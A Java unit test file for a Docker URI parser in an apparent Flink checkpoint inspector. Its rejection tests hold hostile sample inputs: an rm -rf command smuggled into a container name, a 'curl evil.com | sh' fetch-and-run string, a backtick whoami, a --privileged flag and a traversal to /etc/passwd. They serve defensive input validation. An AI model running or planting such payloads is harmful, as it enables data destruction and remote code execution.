package io.flinkstate.inspector.storage;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class DockerStorageConnectorTest {

    @Test
    void parseDockerUriWithContainerAndPath() {
        // Arrange
        String uri = "docker://flink-taskmanager/opt/flink/checkpoints";

        // Act
        String[] result = DockerStorageConnector.parseDockerUri(uri);

        // Assert
        assertThat(result[0]).isEqualTo("flink-taskmanager");
        assertThat(result[1]).isEqualTo("/opt/flink/checkpoints");
    }

    @Test
    void parseDockerUriWithContainerOnly() {
        // Arrange
        String uri = "docker://flink-taskmanager";

        // Act
        String[] result = DockerStorageConnector.parseDockerUri(uri);

        // Assert
        assertThat(result[0]).isEqualTo("flink-taskmanager");
        assertThat(result[1]).isEqualTo("/");
    }

    @Test
    void parseDockerUriWithNestedPath() {
        // Arrange
        String uri = "docker://my-container/var/data/flink/chk-123";

        // Act
        String[] result = DockerStorageConnector.parseDockerUri(uri);

        // Assert
        assertThat(result[0]).isEqualTo("my-container");
        assertThat(result[1]).isEqualTo("/var/data/flink/chk-123");
    }

    @Test
    void rejectsContainerNameWithShellMetachars() {
        // Arrange
        String uri = "docker://legit;rm -rf //path";

        // Act / Assert
        assertThatThrownBy(() -> DockerStorageConnector.parseDockerUri(uri))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("Invalid Docker container name");
    }

    @Test
    void rejectsContainerNameWithDashPrefix() {
        // Arrange
        String uri = "docker://--privileged/path";

        // Act / Assert
        assertThatThrownBy(() -> DockerStorageConnector.parseDockerUri(uri))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("Invalid Docker container name");
    }

    @Test
    void rejectsPathWithShellInjection() {
        // Arrange
        String uri = "docker://container/'; curl evil.com | sh; echo '";

        // Act / Assert
        assertThatThrownBy(() -> DockerStorageConnector.parseDockerUri(uri))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("disallowed characters");
    }

    @Test
    void rejectsPathWithDotDotTraversal() {
        // Arrange
        String uri = "docker://container/opt/../../etc/passwd";

        // Act / Assert
        assertThatThrownBy(() -> DockerStorageConnector.parseDockerUri(uri))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("..");
    }

    @Test
    void rejectsPathWithBacktickInjection() {
        // Arrange
        String uri = "docker://container/path/`whoami`";

        // Act / Assert
        assertThatThrownBy(() -> DockerStorageConnector.parseDockerUri(uri))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("disallowed characters");
    }

    @Test
    void rejectsEmptyContainerName() {
        // Arrange
        String uri = "docker:///path";

        // Act / Assert
        assertThatThrownBy(() -> DockerStorageConnector.parseDockerUri(uri))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("required");
    }

    @Test
    void acceptsValidContainerNamesWithDotsAndUnderscores() {
        // Arrange
        String uri = "docker://my_container.v2/opt/flink";

        // Act
        String[] result = DockerStorageConnector.parseDockerUri(uri);

        // Assert
        assertThat(result[0]).isEqualTo("my_container.v2");
        assertThat(result[1]).isEqualTo("/opt/flink");
    }

    @Test
    void ensureTempDirCreatesTempDirectory() throws IOException {
        // Arrange
        DockerStorageConnector connector = new DockerStorageConnector();

        // Act
        connector.ensureTempDir();

        // Assert
        Path tempDir = connector.getTempDirRef().get();
        assertThat(tempDir).isNotNull();
        assertThat(Files.exists(tempDir)).isTrue();
        assertThat(Files.isDirectory(tempDir)).isTrue();

        // Cleanup
        Files.deleteIfExists(tempDir);
    }

    @Test
    void ensureTempDirIsIdempotent() throws IOException {
        // Arrange
        DockerStorageConnector connector = new DockerStorageConnector();

        // Act
        connector.ensureTempDir();
        Path firstDir = connector.getTempDirRef().get();
        connector.ensureTempDir();
        Path secondDir = connector.getTempDirRef().get();

        // Assert
        assertThat(secondDir).isEqualTo(firstDir);

        // Cleanup
        Files.deleteIfExists(firstDir);
    }

    @Test
    void ensureTempDirIsThreadSafe() throws Exception {
        // Arrange
        DockerStorageConnector connector = new DockerStorageConnector();
        int threadCount = 8;
        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        CountDownLatch startLatch = new CountDownLatch(1);
        List<Future<Path>> futures = new ArrayList<>();

        // Act
        for (int i = 0; i < threadCount; i++) {
            futures.add(executor.submit(() -> {
                startLatch.await();
                connector.ensureTempDir();
                return connector.getTempDirRef().get();
            }));
        }
        startLatch.countDown();

        List<Path> results = new ArrayList<>();
        for (Future<Path> f : futures) {
            results.add(f.get());
        }
        executor.shutdown();

        // Assert
        Path expected = results.get(0);
        assertThat(expected).isNotNull();
        for (Path p : results) {
            assertThat(p).isEqualTo(expected);
        }

        // Cleanup
        Files.deleteIfExists(expected);
    }
}
